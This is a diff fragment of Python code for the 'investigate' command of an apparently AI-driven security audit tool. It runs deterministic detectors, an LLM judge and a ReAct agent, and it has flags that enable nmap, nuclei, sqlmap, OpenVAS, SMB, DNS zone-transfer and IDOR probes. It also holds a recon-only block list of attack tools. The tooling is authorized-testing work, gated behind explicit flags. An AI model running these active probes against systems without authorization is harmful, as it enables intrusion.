+        # Dedup + cross-engine corroboration before seeding the agent (default
+        # on): collapse the same CVE/control from multiple engines (OpenVAS ∪
+        # Cinc ∪ Lynis ∪ native detectors) into one corroborated finding.
+        # KRYON_FINDING_DEDUP=false disables.
+        if deterministic_findings and os.environ.get("KRYON_FINDING_DEDUP", "true").strip().lower() not in {
+            "0",
+            "false",
+            "no",
+            "off",
+        }:
+            from kryon.services.finding_dedup import dedupe_findings
+
+            _n_before = len(deterministic_findings)
+            deterministic_findings = dedupe_findings(deterministic_findings)
+            if len(deterministic_findings) < _n_before:
+                console.print(
+                    f"[dim]dedup:[/dim] {_n_before} → {len(deterministic_findings)} findings (corroboración cruzada)"
+                )
+
+        # FINDING-JUDGE (opt-in KRYON_FINDING_JUDGE) — a second model adjudicates
+        # ONLY the `inferred` findings (CVE-by-version / SAST-no-runtime) the
+        # deterministic layer can't re-probe: REAL → promote to "judge-confirmed",
+        # FALSE → keep inferred + flag. Mutates in place so it flows to BOTH the
+        # agent prompt (below) and the report. The judge client refuses to build
+        # in the banca-safe profile, so this never touches the reproducible core.
+        if deterministic_findings and os.environ.get("KRYON_FINDING_JUDGE", "").strip().lower() in {
+            "1",
+            "true",
+            "yes",
+            "on",
+        }:
+            try:
+                from kryon.intelligence.finding_judge import adjudicate_inferred
+
+                _n_promoted = adjudicate_inferred(deterministic_findings, target=(getattr(args, "url", "") or ""))
+                if _n_promoted:
+                    console.print(
+                        f"[cyan]⚖ finding-judge:[/cyan] {_n_promoted} inferred → judge-confirmed"
+                    )
+            except Exception as _je:  # noqa: BLE001 — must never break the run
+                console.print(f"[yellow]finding-judge warning: {_je}[/yellow]")
+
+        if deterministic_findings:
+            console.print(
+                f"[cyan]🔬 deterministic phase:[/cyan] "
+                f"{len(deterministic_findings)} finding(s) detected before agent loop"
+            )
+            for f in deterministic_findings[:8]:
+                console.print(f"  [dim]→ {getattr(f, 'cwe', '?')} {getattr(f, 'rule_id', '?')}[/dim]")
+            full_prompt = full_prompt + _format_findings_for_prompt(deterministic_findings)
+
+    max_turns = args.max_turns
+    reflect_every = args.reflect_every
+
+    if reflect_every > 0:
+        console.print(
+            f"[dim]starting ReAct loop with reflection every {reflect_every} turns (max_turns={max_turns})[/dim]\n"
+        )
+    else:
+        console.print(f"[dim]starting ReAct loop (max_turns={max_turns}, reflection disabled)[/dim]\n")
+
+    async def _run() -> Any:
+        # F203.Z.B — fire skill-declared pre_hooks BEFORE agent run.
+        # engage.py invokes maybe_run_pre_hooks via _run_phase (F185-C),
+        # but investigate.py was missing this — the F203.V/W/X
+        # web-pentest-{sqli,xss,idor}-active skills had pre_hooks that
+        # never executed. Now they do.
+        agent_input = full_prompt
+        try:
+            from kryon.skills.pre_hook_integration import maybe_run_pre_hooks
+
+            # Outer wall-bound on ALL pre_hooks. Each hook already has its own
+            # timeout + orphan-kill, but a skill with many hooks (or a slow
+            # nuclei/sqlmap target) could still stall the run before the agent
+            # loop starts. Cap the whole phase so the run always progresses.
+            _ph_timeout = float(os.environ.get("KRYON_PREHOOK_TOTAL_TIMEOUT_S", "180"))
+            pre_hook_suffix = await asyncio.wait_for(
+                maybe_run_pre_hooks(agent, full_prompt, console),
+                timeout=_ph_timeout,
+            )
+            if pre_hook_suffix:
+                agent_input = full_prompt + pre_hook_suffix
+        except asyncio.TimeoutError:
+            console.print(f"[yellow]⚠ pre_hooks excedieron {_ph_timeout:.0f}s — continuando sin su salida[/yellow]")
+        except Exception as e:  # noqa: BLE001 — pre_hooks must never break the run
+            console.print(f"[yellow]pre_hook integration warning: {e}[/yellow]")
+
+        # F203.C — use reflective runner when reflect_every > 0
+        if reflect_every > 0:
+            from kryon.cli.reflective_runner import run_with_reflection
+
+            return await run_with_reflection(
+                agent,
+                initial_input=agent_input,
+                reflect_every=reflect_every,
+                max_total_turns=max_turns,
+                run_config=get_run_config(),
+                initial_facts=_seed_initial_facts(args.url or "", deterministic_findings),
+                findings=deterministic_findings,
+            )
+        return await Runner.run(
+            agent,
+            input=agent_input,
+            max_turns=max_turns,
+            run_config=get_run_config(),
+        )
+
+    agent_error: str | None = None
+    try:
+        result = asyncio.run(_run())
+    except KeyboardInterrupt:
+        console.print("\n[yellow]interrupted by user[/yellow]")
+        return 130
+    except Exception as e:  # noqa: BLE001
+        # Don't abort empty-handed. The deterministic detectors may have
+        # already produced findings, and a stuck/looping (or otherwise
+        # crashed) agent run still has value as a PARTIAL report. Fall
+        # through to build + persist a report instead of returning with no
+        # artifact — converts a "failed, no report" run into a "partial
+        # findings" run. The reflective runner finalizes StuckError
+        # gracefully (so it rarely reaches here), but the non-reflective
+        # Runner.run path and any unexpected crash land here as a net.
+        from kryon.sdk.agents.run_outcome import classify_run_exception
+
+        ename = type(e).__name__
+        console.print(f"[yellow]agent run ended early ({ename}: {e}) — emitting partial report[/yellow]")
+        result = None
+        # Use the shared classifier so the partial-report wording for
+        # stuck / max-turns / budget matches the reflective runner + REST route.
+        _outcome = classify_run_exception(e)
+        agent_error = _outcome.message if _outcome is not None else f"{ename}: {e}"
+
+    output = getattr(result, "final_output", None) or ""
+    if agent_error and not output:
+        output = (
+            f"⚠️ El run del agente terminó temprano ({agent_error}). "
+            f"Los hallazgos deterministas abajo son válidos; el análisis del "
+            f"agente quedó incompleto y debe re-ejecutarse o continuarse."
+        )
+
+    # Observability + anti-bluff — build a structured report that separates
+    # VERIFIED (deterministic detectors + validate_* confirmations) from
+    # ALLEGED (the LLM's prose). Persist it to a stable path and print it
+    # FLUSHED so it's visible even when piped (non-TTY) — the old single
+    # ``console.print`` was lost in pipes and left runs with no artifact.
+    try:
+        from kryon.services.investigate_writeback import chain_from_result
+
+        # F203.K — extract from new_items with RunHooks-captured fallback, so
+        # the report never claims "Tool calls: 0" while the agent ran recon
+        # (chunks dropped by MaxTurns, or a stuck/crashed run).
+        chain = chain_from_result(result)
+    except Exception:  # noqa: BLE001
+        chain = []
+    from kryon.cli.investigate_report import (
+        build_investigate_report,
+        persist_investigate_report,
+    )
+
+    report = build_investigate_report(
+        prompt=prompt,
+        active=active,
+        output=output,
+        deterministic_findings=deterministic_findings,
+        chain=chain,
+    )
+    console.print("\n[bold green]═══ Resumen de la investigación ═══[/bold green]\n")
+    print(report, flush=True)
+    try:
+        report_path = persist_investigate_report(report)
+        console.print(f"\n[dim]📄 reporte → {report_path}[/dim]")
+    except Exception as e:  # noqa: BLE001
+        console.print(f"\n[dim]reporte no persistido: {e}[/dim]")
+
+    # F203.F — Write-through al learning loop (best-effort, no bloquea exit).
+    # Skip when the run crashed (result is None): nothing coherent to learn from.
+    if not args.no_writeback and result is not None:
+        try:
+            from kryon.services.investigate_writeback import write_back_from_investigate
+
+            exp_id = write_back_from_investigate(prompt, hints, result)
+            if exp_id:
+                console.print(f"\n[dim]💾 experience persisted: {exp_id}[/dim]")
+        except Exception as e:  # noqa: BLE001
+            console.print(f"\n[dim]write-back skipped: {e}[/dim]")
+
+    # Also persist the same structured report to --out dir if given.
+    if args.out:
+        import datetime as _dt
+
+        out_dir = Path(args.out)
+        out_dir.mkdir(parents=True, exist_ok=True)
+        ts = _dt.datetime.now().strftime("%Y%m%d-%H%M%S")
+        out_path = out_dir / f"investigate-{ts}.md"
+        out_path.write_text(report, encoding="utf-8")
+        console.print(f"\n[green]reporte →[/green] {out_path}")
+
+    return 0
+
+
+def add_investigate_subparser(subparsers) -> argparse.ArgumentParser:
+    p = subparsers.add_parser(
+        "investigate",
+        help="F203.A — open-ended ReAct investigation (no fixed phases)",
+        description=(
+            "Open-ended investigative agent loop. "
+            "Unlike `engage` (which has fixed phases 1-6), `investigate` lets "
+            "the agent decide tools and iteration. Banca-safe by default "
+            "(passive only); use --active to enable nmap/nuclei/etc."
+        ),
+    )
+    p.add_argument(
+        "query",
+        nargs="?",
+        default="",
+        help="natural-language description of what to investigate "
+        "(e.g. 'audita https://eaula.ing.una.py'). "
+        "NOTE: usa positional, no le pongas --query.",
+    )
+    p.add_argument(
+        "--url",
+        default="",
+        help="explicit URL to investigate (alternative/complement to prompt)",
+    )
+    p.add_argument(
+        "--active",
+        action="store_true",
+        help="enable active probing tools (nmap/nuclei/sqlmap). Requires written "
+        "authorization. KRYON_INVESTIGATE_ACTIVE=1 env var also enables.",
+    )
+    p.add_argument(
+        "--recon-only",
+        action="store_true",
+        help="active HTTP discovery WITHOUT port-scanning or exploitation. Even with "
+        "--active, refuses nmap/masscan/sqlmap/hydra/… at the tool layer (sets "
+        "KRYON_RECON_ONLY) so the agent maps the API/app surface over HTTP only.",
+    )
+    p.add_argument(
+        "--openvas",
+        action="store_true",
+        help="Fase 3 — run an OpenVAS/Greenbone active vuln scan (arm's-length GMP). "
+        "Requires --active AND KRYON_OPENVAS_FIRE=true (double-gated; active "
+        "scanning needs written authorization). Findings are normalized + "
+        "applicability-filtered like every other deterministic source.",
+    )
+    p.add_argument(
+        "--cinc",
+        action="store_true",
+        help="run Cinc Auditor (FOSS InSpec) with the dev-sec/CIS profiles. "
+        "Requires --active AND KRYON_CINC_FIRE=true. Read-only compliance-as-code "
+        "over SSH (needs --ssh-user/--ssh-pass or --ssh-key). Applicability-filtered.",
+    )
+    p.add_argument(
+        "--lynis",
+        action="store_true",
+        help="run a Lynis host audit on the target over SSH. Requires --active AND "
+        "KRYON_LYNIS_FIRE=true. Needs lynis on the target + key-based SSH "
+        "(--ssh-user/--ssh-key). Warnings→MEDIUM, suggestions→LOW.",
+    )
+    # F1.5 — respetar KRYON_MAX_TURNS como default del flag (el flag explícito
+    # sigue ganando). Antes investigate ignoraba la env var → corría 30 turnos
+    # siempre, peligroso para el gasto en el perfil API.
+    _mt_env = os.environ.get("KRYON_MAX_TURNS", "").strip()
+    if _mt_env.isdigit():
+        _default_max_turns = int(_mt_env)
+    else:
+        # C — un modelo capable encadena kill-chains más largas; el 30 base está
+        # tuneado para el 4B. El env explícito (KRYON_MAX_TURNS) sigue ganando.
+        from kryon.util.env import is_capable_model  # noqa: PLC0415
+
+        _default_max_turns = 60 if is_capable_model() else 30
+    p.add_argument(
+        "--max-turns",
+        type=int,
+        default=_default_max_turns,
+        help="maximum agent turns before stopping (default: 30, or $KRYON_MAX_TURNS)",
+    )
+    p.add_argument(
+        "--reflect-every",
+        type=int,
+        default=4,
+        help="F203.C — inject reflection turn every N turns "
+        "(default: 4, 0 = disabled). Forces autocrítica + stuck pattern detection.",
+    )
+    p.add_argument(
+        "--no-writeback",
+        action="store_true",
+        help="F203.F — skip persisting the run to the learning loop. "
+        "Default: write-back enabled (KRYON_NO_WRITEBACK=1 env also disables).",
+    )
+    p.add_argument(
+        "--no-hybrid",
+        action="store_true",
+        help="F203.M — skip deterministic Phase 2 checks before agent loop. "
+        "Default: hybrid mode ON (runs HTTP/MySQL detectors first, inyecta "
+        "findings al prompt del agent). For code paths, also skips the "
+        "Mythos-style source-review phase.",
+    )
+    p.add_argument(
+        "--sast-max-files",
+        type=int,
+        default=25,
+        help="source-review: max files sent to the model per run (triage "
+        "ranks by sink-density; default 25). Only applies to local code paths.",
+    )
+    # F203.N.2 — creds-aware deep audit
+    p.add_argument(
+        "--ssh-user",
+        default="",
+        help="F203.N.2 — SSH user for deep audit (sshd_config / users / banner). "
+        "Without it, only banner-grab finding emitted.",
+    )
+    p.add_argument(
+        "--ssh-pass",
+        default="",
+        help="F203.N.2 — SSH password (alternativa: --ssh-key). Banca-safe: "
+        "passwd se pasa como param, no se persiste a disco.",
+    )
+    p.add_argument(
+        "--ssh-key",
+        default="",
+        help="F203.N.2 — ruta a SSH private key (preferido sobre --ssh-pass).",
+    )
+    p.add_argument(
+        "--db-user",
+        default="",
+        help="F203.N.2 — MySQL user para F202.W deep audit (have_ssl / SHOW GRANTS / mysql.user audit).",
+    )
+    p.add_argument(
+        "--db-pass",
+        default="",
+        help="F203.N.2 — MySQL password. Promovido a KRYON_DB_PASSWORD env solo durante la fase deterministica.",
+    )
+    # F203.N.3 — opt-in batteries con dependencia externa
+    p.add_argument(
+        "--include-dns-checks",
+        action="store_true",
+        help="F203.N.3 — ejecuta batería DNS (zone transfer, chaos leak, dnssec, "
+        "open resolver, reverse enum) cuando port=53 o scheme=dns://. Requiere "
+        "nslookup/dig en PATH (graceful skip si falta).",
+    )
+    p.add_argument(
+        "--include-smb-checks",
+        action="store_true",
+        help="F203.N.3 — ejecuta SMB anonymous shares (port 445 / smb:// scheme). "
+        "Requiere smbclient en PATH (graceful skip si falta).",
+    )
+    p.add_argument(
+        "--web-login-url",
+        default="",
+        help="Authenticated probing: login endpoint (absolute or relative to --url). "
+        "POSTs {email,password} as JSON; unlocks IDOR (CWE-639) + mass-assignment "
+        "(CWE-915) probes. Requires --active and an authorized engagement.",
+    )
+    p.add_argument("--web-user", default="", help="Username/email for --web-login-url.")
+    p.add_argument("--web-pass", default="", help="Password for --web-login-url.")
+    p.add_argument(
+        "--web-token-path",
+        default="authentication.token",
+        help="Dotted JSON path to the bearer token in the login response "
+        "(default: authentication.token, matches OWASP Juice Shop).",
+    )
+    p.add_argument(
+        "--out",
+        default="",
+        help="output directory for the transcript (default: don't persist)",
+    )
+    return p
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    sub = parser.add_subparsers(dest="command")
+    add_investigate_subparser(sub)
+    a = parser.parse_args()
+    if a.command == "investigate":
+        sys.exit(run_investigate(a))
+    parser.print_help()
+    sys.exit(2)
